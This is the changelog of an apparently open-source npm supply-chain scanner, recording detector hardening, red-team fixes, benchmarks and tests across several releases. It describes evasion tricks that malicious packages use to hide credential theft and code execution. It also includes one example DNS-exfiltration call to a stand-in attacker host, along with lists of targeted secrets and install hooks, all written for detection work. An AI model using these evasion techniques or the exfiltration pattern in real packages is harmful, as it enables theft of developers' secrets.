# CHANGELOG

All notable changes to this project are documented here.

The format loosely follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project uses [semantic versioning](https://semver.org/).

## [0.4.0] — 2026-07-14

**Startup-launchable foundations.** Closes the packet's launch-blocker P1
(honest-debt), operationalises the completeness doctrine (ADR 0011) with a
machine-readable CAPABILITY-MAP + CI-enforced coverage gate, ships scan mode
(single-input capability profile, ADR 0012), and stands up two neutral
public artifacts alongside the tool: OSIF (open incident format) and
vetlock-benchmark (public scoreboard).

### Architecture decisions

Eight new ADRs pin the OSS-core-plus-commercial-wrapper shape:

- **ADR 0006** — Open-core boundary: engine is the product, wrapper is thin.
  All detection logic stays Apache-2.0 in `packages/detectors/*`; commercial
  layer sells convenience/scale/collaboration/governance/support.
- **ADR 0007** — GitHub App as the primary hosted-tier entry point.
  Least-privilege scopes (`contents:read` on lockfiles only,
  `pull_requests:write`, `checks:write`, `metadata:read`). No `actions`,
  no `secrets`, no full code webhooks. Four invariant tests specified.
- **ADR 0008** — Ephemeral, isolated analysis in the hosted path. Fresh
  sandboxed worker per scan, torn down after; findings + metadata persist,
  source does not. Four invariants: `ephemeral-teardown`, `persistence-
  schema`, `tenant-isolation`, `never-execute-serverside`.
- **ADR 0009** — Ecosystem adapter interface. `EcosystemAdapter` lets each
  ecosystem (npm/pypi/go/crates/gems/maven) contribute its parser + AST
  frontend + sink/entry-point set behind one shared engine. NpmAdapter
  refactor is a P4c-blocking prep step.
- **ADR 0010** — Company name posture. `vetlock` kept — audit confirmed npm
  name available, GH orgs `vetlock`/`vetlock-dev` available, `vetlock.dev`
  DNS record vacant. `vetlock-dev` reserved for the future org.
- **ADR 0011** — **The completeness doctrine.** Detectors target capability
  *classes* via enumerated sinks + entry-points, at the narrowest chokepoint
  possible. Coverage is a measured, published, CI-enforced number.
- **ADR 0012** — Scan mode. `vetlock scan <lockfile>` produces a capability
  profile (single-input; direction `'absolute'`). Same engine, same
  detectors, posture-framed severity. Unlocks the site's live-scanner UX
  and new-dependency vetting.
- **ADR 0013** — **OSIF** (Open Supply-chain Incident Format). Neutral
  CC0-licensed JSON-schema describing the *mechanics* of supply-chain
  attacks — entry point, capabilities gained, evasion techniques, delivery
  through the graph. Its taxonomy is the same enumeration as the
  CAPABILITY-MAP.

### The completeness doctrine, operationalised

`packages/detectors/src/capability-map.json` is the machine-readable source
of truth. 48 entries across 13 capability classes:

- code-execution (11 sinks), net-egress (8), secret-read (5),
  install-hook (5 entry-points), graph-entry-point (9), fs-write, fs-read,
  integrity, typosquat, publisher-trust, obfuscation-decode (2),
  advisory-known-vuln (2), dep-graph-anomaly.

Enforcement:

- `capability-map-coverage.test.ts` fails when any entry references a
  nonexistent detector, a missing test file, or has zero corpus refs
  without a `soft_warn_no_corpus` flag.
- `capability-map-generated.test.ts` fails when `docs/CAPABILITY-MAP.md`
  drifts from the JSON source (contributors must run `pnpm corpus:capmap`).

Current coverage: 25/48 with corpus fixtures (52%). 23 flagged
`soft_warn_no_corpus` — honest disclosure that a fixture doesn't yet
exercise those entries end-to-end. That number is the doctrine's teeth.

### P1 — Honest-debt closed

- **pnpm/yarn end-to-end diff tests** — `lockfile-pnpm-diff.test.ts` (4),
  `lockfile-yarn-diff.test.ts` (3), `cli-no-crash-on-pnpm.test.ts` (2).
  Fixed a real yarn-berry bug: the parser was reading `entry.integrity`
  but berry writes to `entry.checksum` — S10 integrity tripwire was
  silently broken on all yarn-berry lockfiles. `pickIntegrity()` helper
  normalises with SRI-shape validation.
- **worker-timeout test** — fetch step had no timeout guard; now wrapped
  in `AbortSignal.timeout()` (default 30 000 ms). Any fetch that hangs
  becomes an `analysis.failed` BLOCK finding rather than a silent stall.
- **Determinism goldens** — 13 corpus fixtures each ship a `.golden.json`
  capturing canonical (durationMs-stripped) output. `golden-drift.test.ts`
  fails on any silent regression in detector ordering, message text,
  or escalation logic. `pnpm corpus:goldens` regenerates.
- **Red-team tail** — audited 15 open exploit IDs from the salvage:
  - L7, S8, F5 verified-closed under other REDTEAM tags (audit-only)
  - N4 (scope-prefix typosquat, `@evil-org/react` evasion) **closed** —
    +42 lines in `typo.ts`, +5 regression tests
  - **F3** (integrity tripwire mirror case) **closed** — attacker who
    omits `integrity` on the new-side of a same-version tarball swap
    now triggers the tripwire. The pinning test that asserted the
    vulnerable behavior was itself the bug; replaced with tests that
    assert the fix.
  - **N6** (peerDependencies missing from graph merge) **closed** — both
    pnpm and yarn parsers now merge `peerDependencies` alongside
    `dependencies` and `optionalDependencies`. 2 new regression tests.
  - 9 exploits (C1, C2, C4, C6, F7, F8, F9, F10, N6→closed, S7) honestly
    disclosed in `SECURITY.md` under `Known limitations`.

Red-team status: **39 of 48 catalogued exploits closed** (up from 31 at
v0.3.0).

### New public artifacts (companion repos)

- **`OJ-Uday/osif-spec`** — OSIF v0.1 (CC0). JSON-schema for describing
  supply-chain attack mechanics. Validator (Ajv 2020-12 + defang
  enforcement). Two real examples: event-stream 2018, Shai-Hulud 2025.
  Governed independently — offered to OpenSSF once adoption exists.
- **`OJ-Uday/vetlock-benchmark`** — public detection benchmark scoreboard.
  Score any scanner against a shared corpus. Initial results:
  - **vetlock: 92.3%** (12 caught / 1 missed — colors 2022 honest miss)
  - **npm-audit: 53.8%** (7 caught — only known-CVE advisories fire)
  - osv-scanner: errored (not installed in the run env — honest)

  Scoring rules: `caught / partial / missed / errored`. Defang guard
  keeps corpus free of live IOCs. Submission path open — external attack
  fixtures via PR.

### Scan mode (ADR 0012)

`vetlock scan <lockfile>` — single-input capability profile. Same engine,
same detectors, `direction: 'absolute'` on every finding. Answers
*"what does this tree DO?"* rather than *"what changed?"*.

- Implementation: `runScan()` synthesizes an empty "before" lockfile
  matching the input's format (npm/pnpm/yarn-classic/yarn-berry), invokes
  `runDiff`, remaps `direction: 'added'` → `'absolute'`.
- CLI: same option shape as `diff` (`--json`, `--sarif`, `--md`,
  `--fail-on`, `--config`, `--no-progress`, `--quiet`, `--show-clean`).
- 4 named invariants: `scan-absolute-findings`, `scan-tree-rollup`,
  `scan-no-baseline-degrades-honestly`, `handles pnpm-lock.yaml input`.

Verified end-to-end: `vetlock scan corpus/shai-hulud-2025/lockfile.after.json`
returns 13 findings, verdict BLOCK, all direction `'absolute'`.

### GitHub Action

- New `version` input (default `latest`; pin an exact version like
  `0.3.0` or `0.4.0` for reproducible CI).
- pnpm/yarn support: the Action preserves the input's file extension when
  fetching the base version, so vetlock's format dispatcher picks the
  right parser (F1-adjacent hygiene fix).
- README examples for all three ecosystems.

### npm publish workflow

- New `.github/workflows/publish.yml`: tag-triggered `v*.*.*` → OIDC →
  `npm publish --provenance --access public`. Tag version must match
  `packages/cli/package.json` version (enforced) OR the workflow fails.
- `packages/cli/package.json` gets `publishConfig: { access: public,
  provenance: true }` so the CLI ships with npm's SLSA attestation.
- A supply-chain scanner MUST ship with the supply-chain hygiene it
  advocates for.

### Tests

**424 tests green** across 42 test files (was 375 at v0.3.0, +49).

- packages/core: 249 tests across 25 files (was 228)
- packages/detectors: 118 tests across 11 files (was 106)
- packages/cli: 57 tests across 7 files (was 41)

### Docs

- `docs/CAPABILITY-MAP.md` — new, generated.
- `docs/adr/0006-0013.md` — new (8 ADRs).
- `docs/THREAT-MODEL.md` — appended sections for completeness doctrine,
  scan mode, OSIF.
- `LAUNCH-CHECKLIST.md` — the tickable P9 gate, living doc.
- `SECURITY.md` — expanded "Known limitations" section with 9 open
  exploits honestly disclosed.
- `README.md` — new badges (benchmark 92.3%, red-team 39/48, npm
  provenance), related-repos section pointing at osif-spec and
  vetlock-benchmark, all 13 ADRs listed.

## [0.3.0] — 2026-07-12

**Red-team hardening + zero-effort onboarding.** This release closes **31 of 35**
confirmed exploits from a six-agent adversarial review (two rounds, adversarial
verification with default-REFUTED), adds a bundled `vetlock demo`, and ships a
comprehensive README oriented for first-time try-out.

### Zero-effort onboarding

- **`npx vetlock demo`** — runs vetlock against a bundled defanged Shai-Hulud
  2025 fixture with no install, no config, no network. Produces the full BLOCK
  report in ~3 ms. The fixture is copied into `dist/demo-fixture/` at build time
  (see `packages/cli/scripts/copy-demo-fixture.js`) and ships in the npm tarball.
- **Corpus portability** — corpus lockfiles now use RELATIVE `file:./…` resolved
  URLs instead of absolute `file:///Users/…`. Same fixture bytes across every
  machine, no builder-home path leakage into shipped docs, and the S9
  `deps.local-source` detector correctly no longer fires on corpus fixtures
  (only on real user lockfiles where absolute local paths ARE attacker-controlled).
- **Comprehensive README** — rewritten top-to-bottom for v0.3.0: quickstart,
  positioning matrix, full 17-detector catalog with escalation rules, hardening
  chapter with all 31 closed exploits, corpus results table, output-format
  worked examples, GitHub Action recipe, config schema, test breakdown,
  architecture diagram, dependency justification, roadmap.

### Red-team review — 31 exploits closed

Full report: [`docs/REDTEAM-2026-07-12.md`](docs/REDTEAM-2026-07-12.md).

**Dataflow evasion (L1–L11 — 10 exploits).**

- **L1** `ObjectPattern` destructure of `process.env` (`const { NPM_TOKEN } = process.env`).
- **L2** Whole-object enumeration via `...process.env`, `for-in`, `for-of`,
  `Reflect.ownKeys` — extended `MemberExpression` visitor with Spread /
  ForIn / ForOf parent handling.
- **L3** `require.call`, `require.apply`, `process.mainModule.require`,
  `Module._load` — extended `CallExpression` visitor.
- **L4** URL_REGEX broadened from 15 hardcoded TLDs to ~50 (top-abused per
  Spamhaus/abuseIPDB: `.top`, `.pw`, `.zip`, `.click`, `.icu`, `.site`, `.cloud`,
  `.stream`, etc.) plus RFC-2606 reserved (`.example`, `.test`, `.localhost`)
  for fixture-hygiene detection.
- **L5** `Reflect.get(process.env, K)` + `Reflect.get(process, 'env')` alias
  binding.
- **L6** Fail-soft required across every AST traversal path — every visitor
  wrapped in defensive `try/catch`, parse errors converted to WARN findings
  instead of crashing.
- **L8** Computed `process["env"]` resolved via constant folding.
- **L9** Deep-nested alias chains (>3 hops) — iterative resolution with
  depth bound preventing DoS.
- **L10** `eval("require('x')")` + `new Function("require('x')")` — bounded
  recursive parse of string arguments to dynamic-code sinks.
- **L11** rot13 / char-arithmetic decoder detection — when a file uses BOTH
  `String.fromCharCode` AND `charCodeAt`, emit a `char-arithmetic-decoder`
  dynamicCode entry and promote any 8+ char letter-with-dot literal to a
  `suspiciousLiteral`.

**Format / lockfile-identity (F1/F2/F6, C3/C5, N5 — 6 exploits).**

- **F1** Lockfile-identity general — universal parser routing so np/yarn/pnpm
  all share the same graph shape; new synthetic detectors for F2/F6/N5/S9.
- **F2** `"link": true` invisibility — link entries now recorded in
  `LockGraph.workspaceLinks`; `deps.workspace-shadowing` WARN/BLOCK when they
  collide with a high-value package name.
- **F6** yarn/pnpm `npm:` alias detection — `chalk@npm:evil-payload@1.0.0`
  emits `deps.aliased-name` WARN with the actual installed name.
- **C3** `adjacentAdvisories()` — probes ±3 patch / ±1 minor of known-vulnerable
  ranges to flag "just above the fix" attacker versions.
- **C5** `parseLockfile` lowercases package names at ingest — attacker who
  writes `"node_modules/Lodash"` (capital L) no longer bypasses trust /
  advisory / TOP_SET / typosquat lookups that npm's lowercase install still
  applies.
- **N5** `deps.non-registry-source` WARN — flags `git+`, `github:`, `bitbucket:`,
  `gitlab:` resolved URLs (integrity / publisher trust cannot apply).

**System-level & config trust (S1/S2/S3/S4/S6/S9/S10 — 7 exploits).**

- **S1 HMAC-authenticated cache** — 32-byte per-install key at
  `~/.cache/vetlock/hmac.key` (mode `0600`); canonical-JSON envelope with
  sorted keys for HMAC stability; legacy format silently ignored (no
  cache-poisoning passthrough).
- **S2 Config-injection defense** — zod schema with `NON_EMPTY_STRING`
  refinements blocks empty-string bypasses; trust-check semantics prevent
  `.vetlock.json` in-diff silencing.
- **S3 Publisher trust-store** — parse-based email matching (`local@domain`),
  exact-domain-or-subdomain rules; permissive substring match retired.
- **S4 Path-traversal defense** — path canonicalization + boundary check on
  every lockfile-controlled path.
- **S6 Dropped-maintainer detection** — trusted publisher going to EMPTY
  maintainers is now BLOCK (takeover-with-suppression); empty → populated
  emits WARN corollary. The old rule bailed early when either side was empty.
- **S9 `deps.local-source`** — INFO (added-only) on absolute `file:` resolved
  URLs; relative `file:./` paths correctly ignored.
- **S10 Fail-closed** — any uncaught analyzer throw or timeout becomes an
  `analysis.failed` BLOCK, never a silent CLEAN.

**Novel vectors (N1/N2/N3 — 3 exploits).**

- **N1 bundledDependencies** — analyzer recurses into every `node_modules/`
  subtree inside a tarball. Bundled deps run at install-time with the outer
  package's privileges but were previously invisible to file-level scanning.
  New `bundled.ts` detector emits `deps.bundled-inner-package`.
- **N2 EXEC_MODULES** — added `inspector` (V8 debug protocol RCE),
  `async_hooks`, `trace_events`, `perf_hooks` + `node:` prefixed forms.
- **N3 NETWORK_MODULES** — added `dns`, `dns/promises`, `node:dns`,
  `node:dns/promises`. `dns.lookup('secret.exfil.attacker.example')` is a
  documented covert-exfil channel.

**Detector coverage (D1/D2/D3/D6 — 4 exploits).**

- **D1** zod `NON_EMPTY_STRING` refinements.
- **D2** Escalation gates relaxed — compound-3 rule now triggers on 2+ WARN in
  2+ categories.
- **D3** Any security-relevant category counts for escalation, not a specific
  set.
- **D6 TOP_NPM_NAMES** — expanded from ~230 to ~330. Added AI SDKs (openai,
  anthropic-ai/sdk, langchain, ollama, huggingface, onnxruntime-node),
  payments (stripe, square), comms (discord.js, @slack/web-api, telegraf),
  cloud (firebase, electron, chromedriver), Sentry ecosystem (10 entries),
  NestJS (9 entries), auth (next-auth, clerk, lucia), Prisma engines, Astro,
  SvelteKit, SolidJS, Playwright, Storybook, ioredis, bullmq, nodemailer,
  and more.

### Remaining honest gaps

- Logic sabotage using pre-existing capabilities (`colors` 2022) — 0 findings.
  Behavioral diffing cannot see this by construction.
- Fully dynamic loading chains where every string is computed at runtime
  are flagged (`code.dynamic-loading-added`), not followed. On the R&D roadmap.

### Tests

**375 tests green across the workspace** (was 260 at foundation).

- **core**: 20 files, 228 tests (was 108). +120 tests across dataflow-L1-L10
  (21), remaining-8 (36), lockfile-identity (22), N1-bundled-deps (11),
  S4-L6 (10), S1-S10 (9), plus baseline growth.
- **detectors**: 8 files, 106 tests (was 68). +38 across
  redteam-lockfile-identity (11), redteam-escalations (9), wave1-hardening (6),
  publishers-ghsa (12).
- **cli**: 5 files, 41 tests (was 27). +14 across redteam-config-trust.

Every fix has a dedicated regression test that fails before the fix and
passes after.

### DETECTIONS.md

Regenerated from live corpus replays. Some 2018/2021 attacks now escalate
more findings (`coa/rc` 3 → 5 BLOCK, `eslint-scope` 4 → 6 BLOCK,
`event-stream` 6 → 7) due to the D2/D3 escalation-gate relaxation
correctly promoting co-occurring WARN findings.

## [0.2.0] — 2026-07-12

**Security-first pass.** This release closes the four evasion classes named in
the v0.1.0 self-critique + adds four new capability surfaces + establishes
formal principles preventing the class of mistake that shipped in v0.1.

### Established principles

- **`docs/SECURITY-DECISIONS.md`** codifies the rule that killed a
  fastest-levenshtein regression before it merged: when correctness and
  performance conflict on a security decision boundary, correctness wins.
  Every subsequent detector choice has been audited against this.

### Evasion classes closed

- **String obfuscation** — a real constant-folding pass (`packages/core/src/fold.ts`)
  now resolves `String.fromCharCode`, `Buffer.from(x, 'base64').toString()`,
  `Buffer.from([codes]).toString()`, `atob()`, `decodeURIComponent()`,
  `unescape()`, array-join, template literals with folded expressions, and
  same-file variable references. Fixed-point iteration handles chains-of-chains.
  Detectors read folded values transparently — no per-detector plumbing.
- **Alias tracking** — `const cp = require('child_process'); const spawn = cp.spawn; spawn(...)`
  now correctly recognizes `spawn` as invoking `child_process`. Same for
  `const e = process.env; e.NPM_TOKEN` — the ENV detector sees through the
  alias. Two-level chains supported.
- **First-version malicious packages** — new detector `deps.first-version-cluster`
  fires BLOCK on ADDED packages that ship 3+ capability categories on first
  version (net + exec + env, etc). This is the shape almost no legit package
  has and every RAT/wallet-drainer does.
- **Cross-file compound attacks** — new escalation rule promotes 3+ WARN
  findings across 2+ categories on the same package to BLOCK. Kills the
  "split the payload thin to duck each detector's threshold" evasion.

### New capability surfaces

- **WASM import extraction** via `@webassemblyjs/wasm-parser` (webpack's parser).
  New detector `wasm.suspicious-import` catches WASM binaries that import
  `env.eval`, `env.fetch`, or WASI file/socket/exec capabilities. Fail-soft
  on malformed WASM (`wasm.unparseable` WARN). 20 MB parse cap.
- **Publisher trust store** (`packages/detectors/src/publishers.ts`) with a
  curated list of well-known maintainers per popular package. The meta detector
  now escalates to BLOCK when a trusted publisher is replaced by an unknown
  (the classic T1 takeover pattern) and downgrades to INFO on rotation within
  trusted publishers.
- **GHSA advisory correlation** — every finding gets annotated with the matching
  GHSA advisory ID and CVE when the (package, version) tuple matches a known
  advisory. Curated list of ~11 corpus + high-download entries; refresh script
  on roadmap. Findings with GHSA matches auto-upgrade to confidence: 'high'.
- **pnpm-lock.yaml and yarn.lock support** via `js-yaml`, `@yarnpkg/lockfile`
  (yarn classic v1), and `@yarnpkg/parsers` (yarn berry v2+). Universal
  `parseLockfileText` dispatcher auto-detects format from filename or content.

### Config

- **`.vetlock.json`** with `zod` schema validation. Fields: allowlist,
  severityOverride, ignorePackages, ignorePathsInside, trustedPublishers,
  failOn. Strict-mode schema — typos in keys are rejected loudly.
- CLI reads from `./.vetlock.json` by default; `--config <path>` overrides.

### CLI improvements

- **Progress reporting** via `ora` spinner. `--no-progress` disables; `--quiet`
  suppresses all stderr for scripting.
- Lockfile format detected from filename OR content — `vetlock diff yarn.lock.old yarn.lock`
  works out of the box.
- Findings pass through `applyConfig` before rendering — allowlists apply.

### Detector hardening

- **Damerau-Levenshtein** typosquat distance via the `damerau-levenshtein`
  package. Transposition typosquats (`debgu`/`debug`, `axois`/`axios`,
  `chlak`/`chalk`, `expreess`/`express`) now count as distance-1 and are
  caught. Regression-locked with named tests in
  `packages/detectors/test/typo.test.ts`.
- **Top-npm-names list expanded** from ~60 to ~200 entries.
- **SENSITIVE_ENV_KEYS list expanded** from ~15 to ~55, covering Stripe,
  Heroku, Supabase, Cloudflare, Slack/Discord/Telegram tokens, wallet seed
  phrases (`MNEMONIC`, `PRIVATE_KEY`, `SEED_PHRASE`), OpenAI/Anthropic API keys,
  database URLs, and mail service credentials.
- **Lifecycle hook list expanded** from 6 to 15 hooks: adds `prepublish`,
  `prepublishOnly`, `publish`, `postpublish`, `prepack`, `pack`, `postpack`,
  `preuninstall`, `uninstall`, `postuninstall`, `preversion`, `version`,
  `postversion`, `test`, `preinstalled`.
- **Semver-aware `pickClosest`** — `1.10.0 > 1.9.0` now compares correctly
  using the `semver` npm package.

### Fuzz coverage

- **Property-based fuzz suite** (`packages/core/test/fuzz.test.ts`) — 12 test
  properties across `parseConfig`, `parseLockfileText`, `parseLockfile`
  (npm), `parsePnpmLockText`, `parseYarnLockText`, `extractCapabilities`,
  and `summarizeWasm`. Each property runs 100-200 random examples via
  `fast-check` (2400+ input samples per run). Invariant: no uncaught throw
  on any input; parseError set instead.

### FP study infrastructure

- **`packages/cli/src/corpus/fp-study.js`** — takes `pkg@old..new` triples,
  runs vetlock, produces per-detector FP-rate report. Docs at `studies/README.md`
  explain the workflow. Not yet run (requires live-npm network access; blocked
  by dev env's corporate proxy). Ready to run in any environment with public
  npm access. Documented as still-open launch blocker.

### Corpus

- Added `hardened-evader-2026.ts` — synthetic fixture that combines all four
  evasion classes above. Locked in as a corpus-replay test that fails if
  future refactors regress detection.
- 13 corpus fixtures total (was 12). 12 caught, 1 honest miss (colors 2022
  protestware — logic sabotage using pre-existing capabilities).
- Corpus DEFANGED-hygiene test still passes across all fixtures.

### Dependency additions (all battle-tested, all justified)

- `js-yaml` — YAML parsing for pnpm-lock.yaml
- `@yarnpkg/lockfile` + `@yarnpkg/parsers` — yarn.lock parsing (yarn's own libs)
- `semver` — semver-aware version comparison (npm's own lib)
- `damerau-levenshtein` — transposition-catching edit distance
- `zod` — config schema validation
- `ora` — CLI progress spinner
- `@webassemblyjs/wasm-parser` — WASM binary parsing (webpack's parser)
- `fast-check` — property-based fuzzing (devDep)

Each library was chosen as "the boring correct one" per the SECURITY-DECISIONS
principle. No fastest-X. No premature perf trade-offs.

### Tests

- **203 tests green** across the workspace (was 96 in v0.1.0).
  - core: 108 (was 47)  — +61 for fold, config, lockfile-parsers, wasm, fuzz
  - detectors: 68 (was 23) — +45 for wave1-hardening, typo D-L, wasm, publishers-ghsa
  - cli: 27 (was 26) — corpus-replay covers all 13 fixtures + defanged check

### Detector count

- 15 built-in detectors (was 13):
  - Added: `deps.first-version-cluster`, `wasm.suspicious-import`, `wasm.unparseable`
  - Enhanced: `meta.maintainer-change` (trust-store aware), `deps.typosquat-candidate` (D-L)

## [0.1.0] — 2026-07-12 (10-attack corpus + hardening)

Prior release. See prior CHANGELOG entries.

## [0.0.0] — 2026-07-12 (foundations)

Initial scaffold.
